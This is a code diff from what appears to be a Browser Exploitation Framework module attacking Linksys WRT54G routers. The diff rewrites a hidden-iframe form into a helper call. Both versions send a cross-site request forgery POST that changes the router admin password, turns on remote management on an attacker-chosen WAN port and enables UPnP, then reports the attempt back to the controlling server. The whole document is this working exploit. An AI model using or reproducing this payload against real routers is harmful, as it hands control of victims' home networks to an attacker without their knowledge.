@@ -18,90 +18,20 @@ beef.execute(function() {
   var gateway = '<%= @base %>'; 
   var passwd = '<%= @password %>';
 
-  var target = gateway + "manage.tri";
-
-  var wrt54g_iframe = beef.dom.createInvisibleIframe();
-
-  var form = document.createElement('form');
-  form.setAttribute('action', target);
-  form.setAttribute('method', 'post');
-
-  var input = null;
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'remote_mgt_https');
-  input.setAttribute('value', 0);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'http_enable');
-  input.setAttribute('value', 1);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'https_enable');
-  input.setAttribute('value', 0);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'PasswdModify');
-  input.setAttribute('value', 1);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'http_passwd');
-  input.setAttribute('value', passwd);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'http_passwdConfirm');
-  input.setAttribute('value', passwd);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', '_http_enable');
-  input.setAttribute('value', 1);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'web_wl_filter');
-  input.setAttribute('value', 1);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'remote_management');
-  input.setAttribute('value', 1);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'http_wanport');
-  input.setAttribute('value', port);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'upnp_enable');
-  input.setAttribute('value', 1);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'layout');
-  input.setAttribute('value', 'en');
-  form.appendChild(input);
-
-  wrt54g_iframe.contentWindow.document.body.appendChild(form);
-  form.submit();
+  var wrt54g_iframe = beef.dom.createIframeXsrfForm(gateway + "manage.tri", "POST",
+      [{'type':'hidden', 'name':'remote_mgt_https', 'value':'0'} ,
+          {'type':'hidden', 'name':'http_enable', 'value':'1'},
+          {'type':'hidden', 'name':'https_enable', 'value':'0'},
+          {'type':'hidden', 'name':'PasswdModify', 'value':'1'},
+          {'type':'hidden', 'name':'http_passwd', 'value':passwd},
+          {'type':'hidden', 'name':'http_passwdConfirm', 'value':passwd},
+          {'type':'hidden', 'name':'_http_enable', 'value':'1'},
+          {'type':'hidden', 'name':'remote_management', 'value':'1'},
+          {'type':'hidden', 'name':'web_wl_filter', 'value':'1'},
+          {'type':'hidden', 'name':'http_wanport', 'value':port},
+          {'type':'hidden', 'name':'upnp_enable', 'value':'1'},
+          {'type':'hidden', 'name':'layout', 'value':'en'}
+      ]);
 
   beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
 
